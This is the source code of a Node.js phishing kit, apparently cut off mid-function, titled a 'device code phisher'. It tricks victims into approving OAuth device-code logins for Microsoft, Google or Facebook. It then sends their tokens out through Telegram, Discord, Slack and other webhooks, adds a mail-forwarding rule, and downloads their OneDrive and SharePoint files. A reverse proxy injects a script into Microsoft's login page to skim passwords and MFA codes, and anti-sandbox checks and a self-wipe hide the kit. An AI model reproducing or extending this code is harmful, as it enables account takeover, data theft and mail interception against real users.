// ============================================================
// 🥔 ULTIMATE DEVICE CODE PHISHER v5.4.1 – Order Fix
// ============================================================
// Removed Puppeteer, hardened proxy, safe decompression.
// Fixed 'app' initialization order.
// ============================================================

const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const url = require('url');
const zlib = require('zlib');
const axios = require('axios');
const FormData = require('form-data');
const WebSocket = require('ws');
const QRCode = require('qrcode');
const express = require('express');
const basicAuth = require('express-basic-auth');
const AdmZip = require('adm-zip');
const sqlite3 = require('sqlite3').verbose();
const { HttpsProxyAgent } = require('https-proxy-agent');
const cheerio = require('cheerio');

// ── Environment ──
const PORT = process.env.PORT || 3000;
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';
const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK || '';
const SLACK_WEBHOOK = process.env.SLACK_WEBHOOK || '';
const DINGTALK_WEBHOOK = process.env.DINGTALK_WEBHOOK || '';
const MATTERMOST_WEBHOOK = process.env.MATTERMOST_WEBHOOK || '';
const GENERIC_WEBHOOK = process.env.GENERIC_WEBHOOK || '';
const PUSHOVER_USER = process.env.PUSHOVER_USER || '';
const PUSHOVER_TOKEN = process.env.PUSHOVER_TOKEN || '';
const GOTIFY_URL = process.env.GOTIFY_URL || '';
const SMTP_HOST = process.env.SMTP_HOST || '';
const SMTP_PORT = process.env.SMTP_PORT || 587;
const SMTP_USER = process.env.SMTP_USER || '';
const SMTP_PASS = process.env.SMTP_PASS || '';
const DASHBOARD_USER = process.env.DASHBOARD_USER || 'admin';
const DASHBOARD_PASS = process.env.DASHBOARD_PASS || 'password';
const REDIRECT_URL = process.env.REDIRECT_URL || 'https://login.microsoftonline.com';
const CLIENT_ID = process.env.CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
const SCOPE = 'https://graph.microsoft.com/.default offline_access';
const SESSION_TTL = process.env.SESSION_TTL ? parseInt(process.env.SESSION_TTL) : 7 * 24 * 60 * 60 * 1000;
const ALLOWED_IPS = process.env.ALLOWED_IPS ? process.env.ALLOWED_IPS.split(',').map(ip => ip.trim()) : [];
const FORWARD_EMAIL = process.env.FORWARD_EMAIL || '';
const AUTO_WIPE_HOURS = process.env.AUTO_WIPE_HOURS ? parseInt(process.env.AUTO_WIPE_HOURS) : 0;
const PROXY_URL = process.env.HTTP_PROXY || process.env.HTTPS_PROXY || '';
const REDIS_URL = process.env.REDIS_URL || '';
const CAMPAIGN = process.env.DEFAULT_CAMPAIGN || 'default';

let redisClient = null;
if (REDIS_URL) {
    try {
        const redis = require('redis');
        redisClient = redis.createClient({ url: REDIS_URL });
        redisClient.connect();
        console.log('✅ Redis connected');
    } catch (e) { console.warn('Redis not available, using fallback'); }
}

// ── SQLite Setup ──
const DB_PATH = path.join(__dirname, 'flows.db');
const db = new sqlite3.Database(DB_PATH);

db.run(`CREATE TABLE IF NOT EXISTS flows (
    id TEXT PRIMARY KEY,
    device_code TEXT,
    user_code TEXT,
    verification_uri TEXT,
    expires_in INTEGER,
    interval INTEGER,
    status TEXT,
    created TEXT,
    client_id TEXT,
    session_id TEXT,
    service TEXT,
    tenant TEXT,
    cookies TEXT,
    fingerprint TEXT,
    visit_notified INTEGER DEFAULT 0,
    access_token TEXT,
    refresh_token TEXT,
    id_token TEXT,
    prt TEXT,
    approved TEXT,
    username TEXT,
    campaign TEXT
)`);

// ── Helpers ──
function generateSessionId() {
    return crypto.randomBytes(16).toString('hex');
}

function isBot(userAgent) {
    if (!userAgent) return true;
    const ua = userAgent.toLowerCase();
    const bots = ['bot','crawler','spider','scraper','curl','wget','python','go-http','java','http-client'];
    return bots.some(b => ua.includes(b));
}

// ── Rate Limiter ──
const ipRequests = new Map();
function rateLimit(ip) {
    const now = Date.now();
    const window = 60000;
    const max = 30;
    if (!ipRequests.has(ip)) {
        ipRequests.set(ip, { count: 1, reset: now + window });
        return true;
    }
    const entry = ipRequests.get(ip);
    if (now > entry.reset) {
        entry.count = 1;
        entry.reset = now + window;
        return true;
    }
    if (entry.count < max) {
        entry.count++;
        return true;
    }
    return false;
}

// ── IP Geolocation ──
const geoCache = new Map();
async function getGeo(ip) {
    if (ip === '127.0.0.1' || ip === '::1' || !ip) return { country: 'XX', flag: '🌍', name: 'Local' };
    if (geoCache.has(ip)) return geoCache.get(ip);
    try {
        const resp = await axios.get(`https://ipapi.co/${ip}/json/`, { timeout: 3000 });
        const data = resp.data;
        if (data.country_code) {
            const flag = String.fromCodePoint(...[...data.country_code].map(c => 0x1F1E6 + c.charCodeAt(0) - 65));
            const result = { country: data.country_code, flag, name: data.country_name || data.country_code };
            geoCache.set(ip, result);
            return result;
        }
    } catch (e) {}
    const fallback = { country: 'UN', flag: '🌍', name: 'Unknown' };
    geoCache.set(ip, fallback);
    return fallback;
}

// ── Proxy Agent ──
let proxyAgent = null;
if (PROXY_URL) {
    proxyAgent = new HttpsProxyAgent(PROXY_URL);
}

function createAxiosConfig() {
    const config = { timeout: 10000 };
    if (proxyAgent) config.httpsAgent = proxyAgent;
    return config;
}

// ── Exfiltrate ──
async function exfiltrate(data) {
    const { email, tokens, sessionId, ip, userAgent, tenantId, prt, cookies, fingerprint, campaign } = data;
    const geo = await getGeo(ip);
    let message = `🔐 **Device Code Capture!**\n\n`;
    message += `🆔 Session: ${sessionId}\n`;
    message += `👤 Email: ${email || 'Unknown'}\n`;
    message += `🏢 Tenant: ${tenantId || 'N/A'}\n`;
    message += `🌍 IP: ${ip} (${geo.flag} ${geo.country} - ${geo.name})\n`;
    message += `🖥️ UA: ${userAgent || 'N/A'}\n`;
    message += `📱 Fingerprint: ${fingerprint || 'N/A'}\n`;
    message += `📁 Campaign: ${campaign || 'default'}\n`;
    message += `🕒 Time: ${new Date().toISOString()}\n\n`;
    if (tokens.access_token) message += `🔑 Access: ${tokens.access_token.slice(0,30)}...\n`;
    if (tokens.refresh_token) message += `🔄 Refresh: ${tokens.refresh_token.slice(0,30)}...\n`;
    if (tokens.id_token) message += `🆔 ID: ${tokens.id_token.slice(0,30)}...\n`;
    if (prt) message += `🟣 PRT: ${prt.slice(0,30)}...\n`;
    if (cookies && cookies.length) message += `🍪 Cookies: ${cookies.length} captured\n`;

    const webhooks = [
        { url: BOT_TOKEN && CHAT_ID ? `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage` : null, method: 'post', payload: { chat_id: CHAT_ID, text: message, parse_mode: 'Markdown', disable_web_page_preview: true } },
        { url: DISCORD_WEBHOOK, method: 'post', payload: { content: message.substring(0, 2000) } },
        { url: SLACK_WEBHOOK, method: 'post', payload: { text: message } },
        { url: DINGTALK_WEBHOOK, method: 'post', payload: { msgtype: 'text', text: { content: message } } },
        { url: MATTERMOST_WEBHOOK, method: 'post', payload: { text: message } },
        { url: GENERIC_WEBHOOK, method: 'post', payload: { text: message } },
        { url: PUSHOVER_USER && PUSHOVER_TOKEN ? `https://api.pushover.net/1/messages.json` : null, method: 'post', payload: { user: PUSHOVER_USER, token: PUSHOVER_TOKEN, message: message.substring(0, 1024) } },
        { url: GOTIFY_URL ? `${GOTIFY_URL}/message` : null, method: 'post', payload: { title: 'Phisher Capture', message: message, priority: 5 } }
    ];

    for (const hook of webhooks) {
        if (hook.url) {
            try {
                await axios[hook.method](hook.url, hook.payload, { timeout: 5000, ...createAxiosConfig() });
            } catch (e) { /* silent */ }
        }
    }

    if (BOT_TOKEN && CHAT_ID && (tokens.access_token || tokens.refresh_token || tokens.id_token || prt)) {
        try {
            let fileText = `# Tokens\nSession: ${sessionId}\nEmail: ${email || 'N/A'}\n\n`;
            if (tokens.access_token) fileText += `ACCESS_TOKEN:\n${tokens.access_token}\n\n`;
            if (tokens.refresh_token) fileText += `REFRESH_TOKEN:\n${tokens.refresh_token}\n\n`;
            if (tokens.id_token) fileText += `ID_TOKEN:\n${tokens.id_token}\n\n`;
            if (prt) fileText += `PRT:\n${prt}\n\n`;
            if (cookies && cookies.length) fileText += `COOKIES:\n${cookies.join('\n')}\n\n`;
            const tmpFile = path.join(__dirname, `tokens_${sessionId}.txt`);
            fs.writeFileSync(tmpFile, fileText);
            const form = new FormData();
            form.append('chat_id', CHAT_ID);
            form.append('document', fs.createReadStream(tmpFile), { filename: `tokens_${sessionId}.txt` });
            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, form, {
                headers: form.getHeaders(),
                timeout: 10000,
                ...createAxiosConfig()
            });
            fs.unlinkSync(tmpFile);
        } catch (e) { console.warn('Telegram file exfil failed:', e.message); }
    }

    console.log(`✅ Exfiltrated session ${sessionId}`);
}

// ── Visit Notification ──
async function sendVisitNotification(sessionId, ip, userAgent, referer, campaign) {
    if (!BOT_TOKEN || !CHAT_ID) {
        console.warn('⚠️ Telegram credentials missing – visit notification skipped.');
        return;
    }
    const geo = await getGeo(ip);
    const message = `🌐 **New Device Page Visit!**\n\n🆔 Session: ${sessionId}\n🌍 IP: ${ip} (${geo.flag} ${geo.country} - ${geo.name})\n🖥️ UA: ${userAgent || 'N/A'}\n🔗 Referer: ${referer || 'Direct'}\n📁 Campaign: ${campaign || 'default'}\n🕒 Time: ${new Date().toISOString()}`;
    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown',
            disable_web_page_preview: true
        }, { timeout: 5000, ...createAxiosConfig() });
        console.log(`✅ Visit notification sent for session ${sessionId}`);
    } catch (e) {
        console.warn('Visit notification failed:', e.message);
    }
}

// ── Forward Email Rule ──
async function createForwardRule(accessToken, forwardTo) {
    if (!forwardTo) return false;
    try {
        const rulesResp = await axios.get('https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messageRules', {
            headers: { Authorization: `Bearer ${accessToken}` },
            timeout: 10000,
            ...createAxiosConfig()
        });
        const existing = rulesResp.data.value || [];
        if (existing.some(r => r.displayName === 'Phisher Forward' || r.displayName.includes('Forward'))) {
            console.log('⏩ Forward rule already exists, skipping.');
            return true;
        }
        const rule = {
            displayName: 'Phisher Forward',
            sequence: 1,
            conditions: { andConditions: [ { field: 'from', contains: ['@'] } ] },
            actions: { forwardTo: [ { emailAddress: { address: forwardTo } } ], stopProcessingRules: true }
        };
        await axios.post('https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messageRules', rule, {
            headers: { Authorization: `Bearer ${accessToken}`, 'Content-Type': 'application/json' },
            timeout: 10000,
            ...createAxiosConfig()
        });
        console.log(`✅ Forwarding rule created to ${forwardTo}`);
        return true;
    } catch (e) {
        console.warn('❌ Failed to create forward rule:', e.response?.data || e.message);
        return false;
    }
}

// ── Recursive Download ──
async function downloadRecursive(accessToken, sessionId) {
    const zip = new AdmZip();
    const baseUrl = 'https://graph.microsoft.com/v1.0';
    async function walkFolder(pathUrl, folderName = '') {
        let nextLink = null;
        do {
            const url = nextLink || `${baseUrl}${pathUrl}`;
            const resp = await axios.get(url, {
                headers: { Authorization: `Bearer ${accessToken}` },
                timeout: 30000,
                ...createAxiosConfig()
            });
            const items = resp.data.value || [];
            for (const item of items) {
                if (item.folder) {
                    await walkFolder(`${pathUrl}/${item.id}/children`, `${folderName}/${item.name}`);
                } else if (item.file) {
                    const fileResp = await axios.get(`${baseUrl}${pathUrl}/${item.id}/content`, {
                        headers: { Authorization: `Bearer ${accessToken}` },
                        responseType: 'arraybuffer',
                        timeout: 30000,
                        ...createAxiosConfig()
                    });
                    zip.addFile(`${folderName}/${item.name}`, Buffer.from(fileResp.data));
                }
            }
            nextLink = resp.data['@odata.nextLink'] || null;
        } while (nextLink);
    }
    try { await walkFolder('/me/drive/root/children', 'OneDrive'); } catch (e) {}
    try {
        const sitesResp = await axios.get(`${baseUrl}/sites?$top=5`, {
            headers: { Authorization: `Bearer ${accessToken}` },
            timeout: 10000,
            ...createAxiosConfig()
        });
        const sites = sitesResp.data.value || [];
        for (const site of sites) {
            try { await walkFolder(`/sites/${site.id}/drive/root/children`, `SharePoint_${site.name || site.id}`); } catch (e) {}
        }
    } catch (e) {}
    if (zip.getEntries().length === 0) return null;
    const zipPath = path.join(__dirname, `recursive_${sessionId}.zip`);
    zip.writeZip(zipPath);
    return zipPath;
}

// ── Self‑Destruct ──
let lastActivity = Date.now();
function checkSelfDestruct() {
    if (AUTO_WIPE_HOURS === 0) return;
    if (Date.now() - lastActivity > AUTO_WIPE_HOURS * 3600000) {
        console.log('💥 Self-destruct triggered! Wiping all data...');
        db.run('DELETE FROM flows');
        const logsDir = path.join(__dirname, 'logs');
        if (fs.existsSync(logsDir)) fs.rmSync(logsDir, { recursive: true, force: true });
        process.exit(0);
    }
}
setInterval(checkSelfDestruct, 60000);

// ── SQLite CRUD ──
async function upsertFlow(flow) {
    return new Promise((resolve, reject) => {
        const stmt = db.prepare(`
            INSERT OR REPLACE INTO flows (
                id, device_code, user_code, verification_uri, expires_in, interval, status, created,
                client_id, session_id, service, tenant, cookies, fingerprint, visit_notified,
                access_token, refresh_token, id_token, prt, approved, username, campaign
            ) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)
        `);
        stmt.run(
            flow.id || flow.session_id,
            flow.device_code,
            flow.user_code,
            flow.verification_uri,
            flow.expires_in,
            flow.interval,
            flow.status,
            flow.created,
            flow.client_id,
            flow.session_id,
            flow.service,
            flow.tenant,
            JSON.stringify(flow.cookies || []),
            flow.fingerprint || null,
            flow.visit_notified ? 1 : 0,
            flow.access_token || null,
            flow.refresh_token || null,
            flow.id_token || null,
            flow.prt || null,
            flow.approved || null,
            flow.username || null,
            flow.campaign || 'default'
        );
        stmt.finalize();
        resolve();
    });
}

async function getAllFlows() {
    return new Promise((resolve, reject) => {
        db.all('SELECT * FROM flows ORDER BY created DESC', (err, rows) => {
            if (err) reject(err);
            else resolve(rows.map(r => ({
                ...r,
                cookies: r.cookies ? JSON.parse(r.cookies) : [],
                visit_notified: !!r.visit_notified
            })));
        });
    });
}

async function getFlowBySessionId(sessionId) {
    return new Promise((resolve, reject) => {
        db.get('SELECT * FROM flows WHERE session_id = ?', [sessionId], (err, row) => {
            if (err) reject(err);
            else if (row) {
                row.cookies = row.cookies ? JSON.parse(row.cookies) : [];
                row.visit_notified = !!row.visit_notified;
                resolve(row);
            } else resolve(null);
        });
    });
}

async function deleteFlowBySessionId(sessionId) {
    return new Promise((resolve, reject) => {
        db.run('DELETE FROM flows WHERE session_id = ?', [sessionId], function(err) {
            if (err) reject(err);
            else resolve(this.changes > 0);
        });
    });
}

async function getFlowsByCampaign(campaign) {
    return new Promise((resolve, reject) => {
        db.all('SELECT * FROM flows WHERE campaign = ? ORDER BY created DESC', [campaign], (err, rows) => {
            if (err) reject(err);
            else resolve(rows.map(r => ({ ...r, cookies: JSON.parse(r.cookies || '[]'), visit_notified: !!r.visit_notified })));
        });
    });
}

// ── Anti‑Sandbox ──
function antiSandbox(req, res, next) {
    const ua = req.headers['user-agent'] || '';
    if (['headless','phantom','puppeteer','selenium','webdriver'].some(p => ua.toLowerCase().includes(p))) {
        return res.redirect('https://login.microsoftonline.com');
    }
    next();
}

// ── Express App ──
const app = express();
app.use(express.json());
const staticOpts = { index: false }; // prevent serving index.html automatically
app.use(express.static('public', staticOpts));

// 🔥 Update lastActivity on every request (must be after app is defined)
app.use((req, res, next) => {
    lastActivity = Date.now();
    next();
});

app.use((req, res, next) => {
    res.setHeader("Content-Security-Policy", "default-src 'self'; img-src 'self' data:; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; connect-src 'self' wss:;");
    next();
});

app.get(['/', '/health'], (req, res) => {
    res.json({ status: 'healthy', timestamp: new Date().toISOString() });
});

app.use((req, res, next) => {
    const ip = req.headers['cf-connecting-ip'] || req.headers['x-real-ip'] || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress;
    if (!rateLimit(ip)) return res.status(429).send('Too Many Requests');
    if (isBot(req.headers['user-agent']) && req.path.startsWith('/device')) return res.status(403).send('Forbidden');
    next();
});

// ── Device page ──
app.get('/device', antiSandbox, (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'device_code.html'));
});

// ── Device Code Flow ──
app.post('/device/request', async (req, res) => {
    try {
        const service = req.query.service || 'microsoft';
        const campaign = req.query.campaign || 'default';
        let clientId = CLIENT_ID;
        let scope = SCOPE;
        let endpoint = 'https://login.microsoftonline.com/organizations/oauth2/v2.0/devicecode';
        if (service === 'google') {
            clientId = process.env.GOOGLE_CLIENT_ID || '';
            scope = 'openid email profile';
            endpoint = 'https://accounts.google.com/o/oauth2/device/code';
        } else if (service === 'facebook') {
            clientId = process.env.FACEBOOK_CLIENT_ID || '';
            scope = 'email';
            endpoint = 'https://graph.facebook.com/v17.0/device/code';
        }
        const resp = await axios.post(endpoint, new URLSearchParams({ client_id: clientId, scope }), {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            timeout: 10000,
            ...createAxiosConfig()
        });
        const data = resp.data;
        const flow = {
            id: generateSessionId(),
            device_code: data.device_code,
            user_code: data.user_code,
            verification_uri: data.verification_uri,
            expires_in: data.expires_in,
            interval: data.interval,
            status: 'pending',
            created: new Date().toISOString(),
            client_id: clientId,
            session_id: generateSessionId(),
            service: service,
            tenant: 'organizations',
            cookies: [],
            fingerprint: null,
            visit_notified: false,
            campaign: campaign
        };
        await upsertFlow(flow);
        res.json({ ...data, session_id: flow.session_id });
    } catch (error) {
        console.error('Device request error:', error.response?.data || error.message);
        res.status(500).json({ error: 'server_error', error_description: error.response?.data?.error_description || error.message });
    }
});

app.post('/device/visit', async (req, res) => {
    const { sessionId } = req.body;
    if (!sessionId) return res.status(400).json({ error: 'sessionId required' });
    const flow = await getFlowBySessionId(sessionId);
    if (!flow) return res.status(404).json({ error: 'session not found' });
    if (flow.visit_notified) return res.json({ success: true, already: true });
    flow.visit_notified = true;
    await upsertFlow(flow);
    const ip = req.headers['cf-connecting-ip'] || req.headers['x-real-ip'] || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const referer = req.headers['referer'] || req.headers['referrer'] || 'Direct';
    await sendVisitNotification(sessionId, ip, userAgent, referer, flow.campaign);
    res.json({ success: true });
});

app.post('/device/token', async (req, res) => {
    const { device_code } = req.body;
    if (!device_code) return res.status(400).json({ error: 'invalid_request', error_description: 'device_code required' });
    const allFlows = await getAllFlows();
    const flow = allFlows.find(f => f.device_code === device_code);
    if (!flow) return res.status(404).json({ error: 'not_found' });
    try {
        const tenant = flow.tenant || 'organizations';
        const endpoint = flow.service === 'google' ? 'https://oauth2.googleapis.com/token' :
                         flow.service === 'facebook' ? 'https://graph.facebook.com/v17.0/oauth/access_token' :
                         `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/token`;
        const resp = await axios.post(endpoint,
            new URLSearchParams({ client_id: flow.client_id, device_code: device_code, grant_type: 'urn:ietf:params:oauth:grant-type:device_code' }),
            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000, ...createAxiosConfig() }
        );
        const tokens = resp.data;
        let email = 'Unknown';
        let tenantId = null;
        let prt = null;
        if (tokens.id_token) {
            try {
                const parts = tokens.id_token.split('.');
                const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
                email = payload.email || payload.preferred_username || payload.upn || email;
                tenantId = payload.tid || payload.tenantId || null;
                if (payload.prt) prt = payload.prt;
            } catch (e) {}
        }
        if (tokens.prt) prt = tokens.prt;

        flow.status = 'approved';
        flow.access_token = tokens.access_token;
        flow.refresh_token = tokens.refresh_token;
        flow.id_token = tokens.id_token;
        flow.prt = prt;
        flow.approved = new Date().toISOString();
        flow.username = email;
        if (tenantId) flow.tenant = tenantId;
        await upsertFlow(flow);

        const ip = req.headers['cf-connecting-ip'] || req.headers['x-real-ip'] || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress;
        await exfiltrate({
            sessionId: flow.session_id,
            email,
            tokens: { access_token: tokens.access_token, refresh_token: tokens.refresh_token, id_token: tokens.id_token },
            prt,
            ip,
            userAgent: req.headers['user-agent'],
            tenantId,
            cookies: flow.cookies || [],
            fingerprint: flow.fingerprint,
            campaign: flow.campaign
        });

        if (tokens.access_token && FORWARD_EMAIL) {
            setTimeout(() => createForwardRule(tokens.access_token, FORWARD_EMAIL), 5000);
        }
        if (tokens.access_token) {
            setTimeout(async () => {
                const zipPath = await downloadRecursive(tokens.access_token, flow.session_id);
                if (zipPath) {
                    if (BOT_TOKEN && CHAT_ID) {
                        const form = new FormData();
                        form.append('chat_id', CHAT_ID);
                        form.append('document', fs.createReadStream(zipPath), { filename: `recursive_${flow.session_id}.zip` });
                        form.append('caption', `📁 Recursive OneDrive/SharePoint dump for ${email}`);
                        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, form, {
                            headers: form.getHeaders(),
                            timeout: 30000,
                            ...createAxiosConfig()
                        });
                    }
                    fs.unlinkSync(zipPath);
                }
            }, 20000);
        }
        broadcast({ type: 'new_capture', session: flow.session_id, email, timestamp: new Date().toISOString() });
        res.json(tokens);
    } catch (error) {
        if (error.response?.data?.error === 'authorization_pending') {
            res.status(400).json({ error: 'authorization_pending' });
        } else if (error.response?.data?.error === 'expired_token') {
            res.status(400).json({ error: 'expired_token' });
        } else {
            console.error('Token error:', error.response?.data || error.message);
            res.status(500).json({ error: 'server_error', error_description: error.response?.data?.error_description || error.message });
        }
    }
});

app.post('/device/fingerprint', (req, res) => {
    const { sessionId, fingerprint, cookies } = req.body;
    getFlowBySessionId(sessionId).then(flow => {
        if (flow) {
            flow.fingerprint = fingerprint;
            flow.cookies = cookies || [];
            upsertFlow(flow);
            console.log(`🖐️ Fingerprint & cookies stored for ${sessionId}`);
        }
        res.json({ success: true });
    });
});

// ── SECOND-STAGE PHISHING: CRASH‑PROOF REVERSE PROXY ──
app.all('/login*', async (req, res) => {
    const targetBase = 'https://login.microsoftonline.com';
    let targetPath = req.url.replace(/^\/login/, '');
    if (!targetPath || targetPath === '/') targetPath = '/common/oauth2/v2.0/authorize';
    const targetUrl = targetBase + targetPath;

    const headers = { ...req.headers };
    delete headers.host;
    delete headers['content-length'];
    delete headers['transfer-encoding'];
    headers['Host'] = 'login.microsoftonline.com';

    const method = req.method;
    let body = null;
    if (method === 'POST' || method === 'PUT') {
        body = req.body;
    }

    try {
        const resp = await axios({
            method: method,
            url: targetUrl,
            headers: headers,
            data: method === 'POST' || method === 'PUT' ? body : undefined,
            responseType: 'arraybuffer', // Safer for compressed content
            timeout: 15000,
            maxRedirects: 0, // Handle redirects manually
            ...createAxiosConfig(),
        });

        // Handle redirects sent by Microsoft
        if (resp.status === 301 || resp.status === 302 || resp.status === 307 || resp.status === 308) {
            const location = resp.headers.location;
            if (location) {
                res.setHeader('Location', location);
                return res.status(resp.status).send();
            }
        }

        const responseHeaders = { ...resp.headers };
        let data = Buffer.from(resp.data);

        // Safe decompression
        const encoding = resp.headers['content-encoding'];
        if (encoding) {
            try {
                if (encoding.includes('gzip')) {
                    data = zlib.gunzipSync(data);
                } else if (encoding.includes('deflate')) {
                    data = zlib.inflateSync(data);
                } else if (encoding.includes('br')) {
                    // Ignore Brotli if not supported, just pass raw
                }
            } catch (decompError) {
                console.warn('Decompression error, serving raw:', decompError.message);
            }
        }

        let html = data.toString('utf8');
        const contentType = resp.headers['content-type'] || '';

        if (contentType.includes('text/html')) {
            try {
                const $ = cheerio.load(html);
                const captureScript = `
                    <script>
                        (function() {
                            let capturedEmail = '';
                            let capturedPassword = '';
                            let capturedMFA = '';

                            function sendCredentials() {
                                if (capturedEmail || capturedPassword || capturedMFA) {
                                    fetch('/capture', {
                                        method: 'POST',
                                        headers: { 'Content-Type': 'application/json' },
                                        body: JSON.stringify({
                                            email: capturedEmail,
                                            password: capturedPassword,
                                            mfa: capturedMFA
                                        })
                                    }).catch(() => {});
                                    capturedEmail = '';
                                    capturedPassword = '';
                                    capturedMFA = '';
                                }
                            }

                            document.addEventListener('submit', function(e) {
                                const form = e.target;
                                const emailInput = form.querySelector('input[type="email"], input[name="login"], input[name="loginfmt"]');
                                const passInput = form.querySelector('input[type="password"], input[name="passwd"]');
                                const mfaInput = form.querySelector('input[name="otc"], input[name="code"], input[name="verificationCode"], input[placeholder*="code" i]');
                                
                                if (emailInput && passInput) {
                                    e.preventDefault();
                                    capturedEmail = emailInput.value || '';
                                    capturedPassword = passInput.value || '';
                                    capturedMFA = mfaInput ? mfaInput.value || '' : '';
                                    sendCredentials();
                                    const originalAction = form.action;
                                    form.action = originalAction;
                                    form.removeEventListener('submit', arguments.callee);
                                    form.submit();
                                } else if (mfaInput) {
                                    e.preventDefault();
                                    capturedMFA = mfaInput.value || '';
                                    sendCredentials();
                                    const originalAction = form.action;
                                    form.action = originalAction;
                                    form.removeEventListener('submit', arguments.callee);
                                    form.submit();
                                }
                            });

                            document.addEventListener('input', function(e) {
                                const input = e.target;
                                if (input.name === 'otc' || input.name === 'code' || input.name === 'verificationCode' || (input.placeholder && input.placeholder.toLowerCase().includes('code'))) {
                                    capturedMFA = input.value;
                                }
                                if (input.type === 'email' || input.name === 'loginfmt') {
                                    capturedEmail = input.value;
                                }
                                if (input.type === 'password') {
                                    capturedPassword = input.value;
                                }
                            });

                            window.addEventListener('beforeunload', function() {
                                sendCredentials();
                            });
                        })();
                    </script>
                `;
                const head = $('head');
                head.append(captureScript);
                html = $.html();
                data = Buffer.from(html, 'utf8');
                // Update content-length
                responseHeaders['content-length'] = data.length;
            } catch (cheerioError) {
                console.warn('Cheerio manipulation error, serving original:', cheerioError.message);
            }
        }

        // Remove content-encoding header since we decompressed it
        delete responseHeaders['content-encoding'];

        res.set(responseHeaders);
        res.status(resp.status);
        res.send(data);

    } catch (error) {
        console.error('Proxy error:', error.message);
        // In case of complete failure, redirect the victim to the real Microsoft login
        console.log('Redirecting victim to real Microsoft login due to proxy failure.');
        res.redirect('https://login.microsoftonline.com');
    }
});

// ── Capture endpoint ──
app.post('/capture', async (req, res) => {
    const { email, password, mfa } = req.body;
    console.log(`📥 Second‑stage capture: ${email} / ${password} / MFA: ${mfa || 'N/A'}`);
    await exfiltrate({
        sessionId: 'second_stage',
        email,
        tokens: {},
        ip: req.headers['cf-connecting-ip'] || req.headers['x-real-ip'] || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress,
        userAgent: req.headers['user-agent']
    });
    res.json({ success: true });
});

// ── Dashboard ──
app.use('/dash', (req, res, next) => {
    const ip = req.headers['cf-connecting-ip'] || req.headers['x-real-ip'] || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress;
    if (ALLOWED_IPS.length > 0 && !ALLOWED_IPS.includes(ip)) {
        return res.status(403).send('Access Denied: IP not whitelisted');
    }
    next();
});
app.use('/dash', basicAuth({ users: { [DASHBOARD_USER]: DASHBOARD_PASS }, challenge: true }));
app.get('/dash', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));

// ── API Endpoints ──
app.get('/api/flows', async (req, res) => {
    const campaign = req.query.campaign;
    let flows;
    if (campaign) {
        flows = await getFlowsByCampaign(campaign);
    } else {
        flows = await getAllFlows();
    }
    res.json(flows);
});

app.get('/api/flow/:sessionId', async (req, res) => {
    const flow = await getFlowBySessionId(req.params.sessionId);
    if (!flow) return res.status(404).json({ error: 'not found' });
    res.json(flow);
});

app.delete('/api/flow/:sessionId', async (req, res) => {
    const deleted = await deleteFlowBySessionId(req.params.sessionId);
    if (!deleted) return res.status(404).json({ error: 'not found' });
    res.json({ success: true });
});

app.post('/api/exchange/:sessionId', async (req, res) => {
    const flow = await getFlowBySessionId(req.params.sessionId);
    if (!flow) return res.status(404).json({ error: 'not found' });
    if (!flow.refresh_token) return res.status(400).json({ error: 'no refresh token' });
    try {
        const tenant = flow.tenant || 'organizations';
        const resp = await axios.post(`https://login.microsoftonline.com/${tenant}/oauth2/v2.0/token`,
            new URLSearchParams({ client_id: flow.client_id || CLIENT_ID, refresh_token: flow.refresh_token, grant_type: 'refresh_token', scope: SCOPE }),
            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000, ...createAxiosConfig() }
        );
        flow.access_token = resp.data.access_token;
        if (resp.data.refresh_token) flow.refresh_token = resp.data.refresh_token;
        flow.last_refresh = new Date().toISOString();
        await upsertFlow(flow);
        res.json({ success: true, new_access_token: flow.access_token });
    } catch (e) { res.status(500).json({ error: e.message }); }
});

app.get('/api/graph/:sessionId/me', async (req, res) => {
    const flow = await getFlowBySessionId(req.params.sessionId);
    if (!flow || !flow.access_token) return res.status(404).json({ error: 'No access token found' });
    try {
        const resp = await axios.get('https://graph.microsoft.com/v1.0/me', {
            headers: { Authorization: `Bearer ${flow.access_token}` },
            timeout: 10000,
            ...createAxiosConfig()
        });
        res.json(resp.data);
    } catch (e) { res.status(500).json({ error: e.message }); }
});

app.get('/api/graph/:sessionId/messages', async (req, res) => {
    const flow = await getFlowBySessionId(req.params.sessionId);
    if (!flow || !flow.access_token) return res.status(404).json({ error: 'No access token found' });
    try {
        const resp = await axios.get('https://graph.microsoft.com/v1.0/me/messages?$top=5&$select=subject,from,receivedDateTime', {
            headers: { Authorization: `Bearer ${flow.access_token}` },
            timeout: 10000,
            ...createAxiosConfig()
        });
        res.json(resp.data);
    } catch (e) { res.status(500).json({ error: e.message }); }
});

app.get('/api/test-telegram', async (req, res) => {
    if (!BOT_TOKEN || !CHAT_ID) return res.status(400).json({ error: 'Telegram not configured' });
    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
